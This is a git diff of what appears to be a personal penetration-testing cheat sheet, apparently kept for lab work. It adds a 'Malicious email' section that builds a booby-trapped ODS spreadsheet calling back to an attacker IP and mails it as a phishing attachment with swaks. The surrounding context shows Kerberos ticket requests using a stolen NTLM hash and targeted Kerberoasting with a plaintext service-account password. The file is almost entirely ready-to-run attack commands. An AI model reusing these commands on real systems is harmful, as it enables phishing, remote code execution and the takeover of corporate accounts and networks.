@@ -1773,3 +1773,10 @@ getTGT.py $dom/john -dc-ip $ip -hashes :6DFCB20C87D04F9A4F9605F2413395D4
 source /opt/windows/targetedKerberoast/venv/bin/activate
 python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip
 ```
+
+#### Malicious email
+
+```bash
+python /opt/mmg-ods.py windows 192.168.45.178 80
+sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.218.140 --body body.txt --header "Subject: Staging Script"
+```
